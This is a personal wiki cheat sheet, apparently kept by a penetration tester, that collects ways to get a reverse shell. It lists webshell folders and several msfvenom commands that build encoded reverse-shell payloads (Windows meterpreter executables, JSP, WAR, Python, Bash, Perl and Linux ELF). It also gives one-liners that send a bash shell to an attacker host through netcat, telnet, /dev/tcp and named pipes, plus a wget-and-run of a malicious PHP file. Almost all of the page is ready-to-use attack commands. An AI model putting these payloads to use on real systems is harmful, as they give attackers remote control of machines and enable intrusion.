Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2019-02-08T11:58:06+05:30

====== Shell ======
Created Friday 08 February 2019

1. **Reverse Shell**
	a. cd [[/usr/share/webshells/asp]]
	b. cd  [[/usr/share/webshells/aspx]]
	c. cd [[/usr/share/webshells/cfm]]
	d. cd [[/usr/share/webshells/jsp]]
	e. cd [[/usr/share/webshells/perl]]
	f. cd [[/usr/share/webshells/php]]
	g. One liner - Follow http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet - bash, perl, python, php, ruby, netcat, java, xterm, 

2. **Msfvenom**
	a. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
	b. JSP - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
	c. WAR - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
	d. Python - msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
	e. Bash - msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
	f. Perl - msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
	g. Follow - https://netsec.ws/?p=331
	h. msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o [[/tmp/1.exe]]
	i. msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o [[/tmp/freesweep_scores]]
	j. Follow - http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/		**#Best**
	k. Follow - https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/

3. **Extra - Reverse Shell**
	a. Different ways to get shell - https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
		1. #1 nc <attacker_ip> <port> -e [[/bin/bash]]
		2. #2 When the GAPING_SECURITY_HOLE is disabled, which means you don't have access to the '-e' option of netcat.Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.
			a. mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
		3. #3 /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
		4. #4 mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
		5. #5 telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
		6. #6 wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php

